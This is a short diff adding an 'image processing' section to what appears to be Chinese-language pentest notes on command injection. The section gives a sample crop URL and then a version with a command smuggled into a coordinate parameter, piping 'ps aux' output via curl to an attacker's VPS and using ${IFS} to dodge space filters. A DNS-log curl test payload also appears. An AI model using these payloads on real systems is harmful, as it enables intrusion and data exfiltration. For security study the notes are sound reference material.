@@ -69,6 +69,11 @@
 + ```sleep 5```
 + ```curl xxx.dnslog.com```
 
+图像处理的地方
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ 如： ``/edit/process?imageid-=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0&w=700&h=746&random=4011802027746510515424``
++ ``/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0%20-write%20|ps${IFS}aux|curl${IFS}http://<yourVPS>{IFS}-d${IFS}@-&w=700&h=746&random=4011802027746510515424``
+
 
 常见绕过方式
 ----------------------------------------
